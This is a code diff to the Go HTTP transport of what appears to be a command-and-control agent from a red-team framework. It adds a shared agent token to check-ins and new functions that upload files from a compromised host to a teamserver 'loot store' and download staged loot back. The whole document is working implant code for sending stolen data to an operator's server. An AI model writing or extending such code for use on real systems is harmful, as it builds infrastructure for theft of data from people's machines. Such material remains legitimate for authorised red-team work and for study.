@@ -18,12 +18,15 @@ import (
 type HTTP struct {
 	baseURL string
 	client  *http.Client
+	Token   string // shared agent token; set on requests with agent_token fields
 }
 
 // Options configures the agent HTTP(S) transport.
 type Options struct {
 	// InsecureSkipVerify skips TLS certificate verification (lab self-signed certs).
 	InsecureSkipVerify bool
+	// Token is the shared agent secret (LATTICE_AGENT_TOKEN).
+	Token string
 }
 
 // NewHTTP builds a transport pointed at baseURL, e.g. https://127.0.0.1:8443.
@@ -34,6 +37,7 @@ func NewHTTP(baseURL string, opts Options) *HTTP {
 	}
 	return &HTTP{
 		baseURL: baseURL,
+		Token:   opts.Token,
 		client: &http.Client{
 			Timeout:   30 * time.Second,
 			Transport: transport,
@@ -43,8 +47,51 @@ func NewHTTP(baseURL string, opts Options) *HTTP {
 
 // CheckIn posts an AgentCheckIn and returns the server response.
 func (h *HTTP) CheckIn(ctx context.Context, in *agentv1.AgentCheckIn) (*agentv1.AgentCheckInResponse, error) {
+	if in != nil && h.Token != "" {
+		in.AgentToken = h.Token
+	}
 	var out agentv1.AgentCheckInResponse
 	if err := h.post(ctx, "/v1/checkin", in, &out); err != nil {
+		return nil, err
+	}
+	return &out, nil
+}
+
+// PostLootUpload deposits a file into the teamserver loot store (POST /v1/loot/upload).
+func (h *HTTP) PostLootUpload(ctx context.Context, in *agentv1.AgentLootUpload) (*agentv1.AgentLootUploadResponse, error) {
+	if in != nil && h.Token != "" {
+		in.AgentToken = h.Token
+	}
+	prev := h.client
+	h.client = &http.Client{
+		Timeout:   5 * time.Minute,
+		Transport: prev.Transport,
+	}
+	defer func() { h.client = prev }()
+
+	var out agentv1.AgentLootUploadResponse
+	if err := h.post(ctx, "/v1/loot/upload", in, &out); err != nil {
+		return nil, err
+	}
+	return &out, nil
+}
+
+// DownloadLoot fetches staged loot bytes (POST /v1/loot/download).
+func (h *HTTP) DownloadLoot(ctx context.Context, agentID, lootID string) (*agentv1.AgentLootDownloadResponse, error) {
+	prev := h.client
+	h.client = &http.Client{
+		Timeout:   5 * time.Minute,
+		Transport: prev.Transport,
+	}
+	defer func() { h.client = prev }()
+
+	var out agentv1.AgentLootDownloadResponse
+	err := h.post(ctx, "/v1/loot/download", &agentv1.AgentLootDownload{
+		AgentId:    agentID,
+		AgentToken: h.Token,
+		LootId:     lootID,
+	}, &out)
+	if err != nil {
 		return nil, err
 	}
 	return &out, nil
